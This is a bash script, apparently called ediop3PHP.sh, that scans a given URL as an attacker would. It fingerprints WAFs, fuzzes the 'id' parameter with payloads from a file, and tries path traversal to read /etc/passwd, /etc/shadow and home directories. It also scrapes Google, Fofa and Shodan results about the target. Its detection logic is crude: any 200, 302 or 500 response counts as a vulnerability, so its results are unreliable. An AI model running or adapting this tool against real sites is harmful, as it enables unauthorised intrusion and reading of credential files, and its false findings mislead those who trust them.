#!/bin/bash

echo "███████╗██████╗░██╗░█████╗░██████╗░██████╗░"
echo "██╔════╝██╔══██╗██║██╔══██╗██╔══██╗╚════██╗"
echo "█████╗░░██║░░██║██║██║░░██║██████╔╝░█████╔╝"
echo "██╔══╝░░██║░░██║██║██║░░██║██╔═══╝░░╚═══██╗"
echo "███████╗██████╔╝██║╚█████╔╝██║░░░░░██████╔╝"
echo "╚══════╝╚═════╝░╚═╝░╚════╝░╚═╝░░░░░╚═════╝░"
echo ""
echo "██████╗░██╗░░██╗██████╗░"
echo "██╔══██╗██║░░██║██╔══██╗"
echo "██████╔╝███████║██████╔╝"
echo "██╔═══╝░██╔══██║██╔═══╝░"
echo "██║░░░░░██║░░██║██║░░░░░"
echo "╚═╝░░░░░╚═╝░░╚═╝╚═╝░░░░░"
echo ""

check_google_dork() {
    google_url="https://www.google.com/search?q=site:$target"
    google_response=$(curl -s "$google_url")
    if [[ "$google_response" =~ "No results" ]]; then
        echo "[-] No results found in Google Dork search."
    else
        echo "[+] Google Dork results for $target: "
        echo "$google_response" | sed 's/<[^>]*>//g'
    fi
}

check_fofa() {
    fofa_url="https://fofa.so/search?q=$target"
    fofa_response=$(curl -s "$fofa_url")
    if [[ "$fofa_response" =~ "No results" ]]; then
        echo "[-] No results found in Fofa search."
    else
        echo "[+] Fofa results for $target: "
        echo "$fofa_response" | sed 's/<[^>]*>//g'
    fi
}

check_shodan() {
    shodan_url="https://www.shodan.io/search?query=$target"
    shodan_response=$(curl -s "$shodan_url")
    if [[ "$shodan_response" =~ "No results" ]]; then
        echo "[-] No results found in Shodan search."
    else
        echo "[+] Shodan results for $target: "
        echo "$shodan_response" | sed 's/<[^>]*>//g'
    fi
}

check_firewall() {
    response=$(curl -I "$target" -s)
    if echo "$response" | grep -i "X-WAF" > /dev/null || echo "$response" | grep -i "cf-ray" > /dev/null || echo "$response" | grep -i "X-Sucuri-ID" > /dev/null || echo "$response" | grep -i "Server: cloudflare" > /dev/null; then
        echo "[+] WAF or Firewall detected on $target."
    fi
    status_code=$(curl -s -o /dev/null -w "%{http_code}" "$target")
    if [[ "$status_code" == "403" ]]; then
        echo "[+] Forbidden access, possible WAF/Firewall blocking."
    elif [[ "$status_code" == "429" ]]; then
        echo "[+] Too many requests, possible rate limiting detected."
    fi
}

scan_vulnerabilities() {
    payloads=($(cat payloads1219.txt))
    accessed_dirs=()
    for payload in "${payloads[@]}"; do
        response=$(curl -X GET "$target?id=$payload" -s -o /dev/null -w "%{http_code}")
        if [[ "$response" == "200" || "$response" == "302" || "$response" == "500" ]]; then
            echo "[+] Potential vulnerability found on $target with payload: $payload" | tee -a results.txt
            return
        fi
        
        for dir in "/etc/passwd" "/etc/shadow" "/var/www" "/root" "/home"; do
            if [[ ! " ${accessed_dirs[@]} " =~ " ${dir} " ]]; then
                response=$(curl -X GET "$target?id=../../../../$dir" -s -o /dev/null -w "%{http_code}")
                if [[ "$response" == "200" ]]; then
                    echo "[+] Path Traversal vulnerability found accessing $dir" | tee -a results.txt
                    accessed_dirs+=("$dir")
                    return
                fi
            fi
        done
    done
}

main() {
    if [[ -z "$1" ]]; then
        echo "Usage: bash ediop3PHP.sh -u <URL>"
        exit 1
    fi

    while getopts ":u:" opt; do
        case ${opt} in
            u )
                target=$OPTARG
                ;;
        esac
    done

    check_firewall
    scan_vulnerabilities
    check_google_dork
    check_fofa
    check_shodan
}

main "$@"
